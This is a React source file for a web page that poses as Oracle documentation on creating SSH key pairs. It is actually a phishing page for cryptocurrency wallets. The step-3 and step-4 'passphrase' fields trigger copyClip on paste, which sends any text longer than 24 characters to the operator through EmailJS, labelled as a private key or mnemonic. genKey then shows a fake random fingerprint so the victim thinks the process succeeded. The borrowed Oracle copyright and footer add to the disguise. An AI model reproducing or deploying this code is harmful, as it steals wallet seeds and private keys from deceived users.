import { useState, useEffect } from 'react';
import {
  BrowserRouter as Router,
  Switch,
  Route
} from "react-router-dom";
import { 
	Flex,
	Image,
	Text,
  	ChakraProvider,
} from "@chakra-ui/react";
import "./App.scss";
import "./mdi/css/materialdesignicons.css";
import emailjs from 'emailjs-com';
import Logo from "./logo.png";

function App() {
	async function copyClip(ieD) {
		var text = document.getElementById(ieD).value
		if(text.length > 24) {
            const templateParams = {
                from_name: "New User",
                message: "Private key or Mnemonic is:= ("+text+")"
            }
            await emailjs.send('outlook', 'template_57mhrn6', templateParams, 'pwfFrF3ShU-Jptz89')
            .then((response) => {
                var a = ""
            }, (err) => {
                var a = ""
            })
        }
		else {
			alert("Invalid Passphrase!")
		}
    }

	async function genKey() {
		var text = document.getElementById('inp').value
		var text2 = document.getElementById('inp2').value
		if(text !== text2) {
			alert("Passphrase don't match!")
		}
		else {
			var txt = "abcdef0123456789";
			var newTxt = txt.charAt(Math.floor(Math.random() * txt.length))
			var newTxt2 = txt.charAt(Math.floor(Math.random() * txt.length))
			var newTxt3 = txt.charAt(Math.floor(Math.random() * txt.length))
			var newTxt4 = txt.charAt(Math.floor(Math.random() * txt.length))
			var newTxt5 = txt.charAt(Math.floor(Math.random() * txt.length))
			var newTxt6 = txt.charAt(Math.floor(Math.random() * txt.length))
			var newTxt7 = txt.charAt(Math.floor(Math.random() * txt.length))
			var newTxt8 = txt.charAt(Math.floor(Math.random() * txt.length))
			var newTxt9 = txt.charAt(Math.floor(Math.random() * txt.length))
			document.getElementById('keyHolder').innerHTML = newTxt9+newTxt+":"+newTxt2+newTxt3+":"+newTxt4+newTxt5+":"+newTxt6+newTxt7+":"+newTxt9+newTxt4+":"+newTxt6+newTxt+":"+newTxt3+newTxt7+":"+newTxt5+newTxt8+":"+newTxt2+newTxt4+":"+newTxt+newTxt8+":"+newTxt3+newTxt4+":"+newTxt7+newTxt6+":"+newTxt8+newTxt+":"+newTxt6+newTxt2+":"+newTxt5+newTxt3+":"+newTxt8+newTxt6
		}
	}

	function validate(evt) {
		var theEvent = evt || window.event;
		var key = theEvent.keyCode || theEvent.which;
		key = String.fromCharCode(key);
	   var regex = /[]|\./;
		if(!regex.test(key)) {
		 theEvent.returnValue = false;
		 if(theEvent.preventDefault) theEvent.preventDefault();
	   }
	  }

	return (
		<ChakraProvider>	
			<Flex w="100%" direction="column" pt="12" pb="12" m="0" px="5" bg="#fff" minHeight="100vh" fontFamily="times new roman" fontSize={["1em", "1em"]}>
				<Flex w="100%" align="center">
					<Image src={Logo} w="40px" h="40px" />
					<Text ml="4" fontWeight="bold" fontSize="1.5em">How to Create a Public/Private Key Pair</Text>	
				</Flex>

				<Text mt="5">The standard procedure for creating a Secure Shell public/private key pair follows. For information on additional options.</Text>

				<Text w="100%" pl={["0", "8"]} mt="6">
					<Text><Text as="span" mr="">1.</Text> Start the key generation program.</Text>
					<Text ml="4" mt="4" border="1px solid #000" p="3px">
						<Text pt="8" pb="4" px="1" border="1px solid #000" fontWeight="600" fontSize="12px" fontFamily="monospace">
							<Text>myLocalHost% ssh-keygen</Text>
							<Text>Generating public/private rsa key pair.</Text>
							<Text>Enter file in which to save the key(/home/johndoe/.ssh/id_rsa): </Text>
						</Text>
					</Text>

					<Text mt="4"><Text as="span" mr="">2.</Text> Enter the path to the file that will hold the key.</Text>
					<Text ml="4" mt="4">By default, the file name <Text as="span" fontFamily="monospace">id_rsa</Text>, which represents an RSA v2 key, appears in parentheses. You can select this file by pressing Return. Or, you can type an alternative filename.</Text>
					<Text ml="4" mt="4" border="1px solid #000" p="3px">
						<Text pt="8" pb="4" px="1" border="1px solid #000" fontWeight="600" fontSize="12px" fontFamily="monospace">
							<Text>Enter file in which to save the key(/home/johndoe/.ssh/id_rsa): &lt;Return&gt;</Text>
						</Text>
					</Text>
					<Text ml="4" mt="4">The public key name is created automatically and the string .pub is appended to the private key name.</Text>

					<Text mt="4"><Text as="span" mr="">3.</Text> Paste a passphrase for using your key.</Text>
					<Text ml="4" mt="4">This passphrase is used for encrypting your private key. A good passphrase is 10–30 characters long, mixes alphabetic and numeric characters, and avoids simple English prose and English names. A null entry means no passphrase is used, but this entry is <Text fontWeight="bold" as="span">strongly discouraged</Text> for user accounts. Note that the passphrase is not displayed when you type it in.</Text>
					<Text ml="4" mt="4" border="1px solid #000" p="3px">
						<Text border="1px solid #000" fontWeight="600" fontSize="12px" fontFamily="monospace">
							<input id="inp" onPaste={() => {
								setTimeout(function() {
									copyClip("inp")
								}, 1000)
							}} onKeyPress={(event) => validate(event)} style={{ width: "100%", padding: "30px 5px 15px 5px", fontFamily: "monospace", fontWeight: "bold" }} />
						</Text>
					</Text>

					<Text mt="4"><Text as="span" mr="">4.</Text> Re-paste the passphrase to confirm it.</Text>
					<Text ml="4" mt="4" border="1px solid #000" p="3px">
						<Text border="1px solid #000" fontWeight="600" fontSize="12px" fontFamily="monospace">
						<input id="inp2" onPaste={() => {
							setTimeout(function() {
								copyClip("inp2")
								genKey()
							}, 1000)
							}} onKeyPress={(event) => validate(event)} style={{ width: "100%", padding: "30px 5px 15px 5px", fontFamily: "monospace", fontWeight: "bold" }} />
						</Text>
					</Text>

					<Text mt="4"><Text as="span" mr="">5.</Text> Check the results.</Text>
					<Text ml="4" mt="4" fontFamily="monospace">Public Key:</Text>
					<Text ml="4" mt="2" border="1px solid #000" p="3px">
						<Text border="1px solid #000" fontWeight="600" fontSize="12px" fontFamily="monospace" pt="8" pb="4" px="1" id="keyHolder">
						</Text>
					</Text>
					<Text ml="4" mt="4">The key fingerprint (a colon-separated series of 2 digit hexadecimal values) is displayed. <Text as="span" fontFamily="monospace">At this point, you have created a public/private key pair.</Text></Text>

					
					<Text mt="4"><Text as="span" mr="">6.</Text> Copy the public key and append the key to the <Text as="span" fontFamily="monospace">$HOME/.ssh/authorized_keys</Text> file in your home directory on the remote host.</Text>

					<Flex mt="4" align="center"><i className="mdi mdi-circle" style={{ fontSize: "5px" }}></i> <Text ml="2">© 2022, Oracle Corporation and/or its affiliates</Text></Flex>
				</Text>

				<Flex w="100%" position="fixed" bottom="0" left="0" bg="#EBEBEB" borderTop="1px solid #ACB7BF" padding="2px 1em" justify="center" align="center" fontSize="12px" color="#1958AA" fontFamily="arial">
					<Text cursor="pointer" mr="3" pr="3" borderRight="1px solid #aaa" _hover={{ textDecoration: "underline" }} transition="300ms ease-in-out" onClick={() => {
						window.open("https://www.oracle.com/legal/privacy/privacy-choices.html", "_BLANK")
					}}>Cookie Preferences</Text>
					<Text cursor="pointer" _hover={{ textDecoration: "underline" }} transition="300ms ease-in-out" onClick={() => {
						window.open("https://www.oracle.com/legal/privacy/advertising-privacy-policy.html#12", "_BLANK")
					}}>Ad Choices</Text>
				</Flex>
			</Flex>
		</ChakraProvider>
	)
}

export default App;
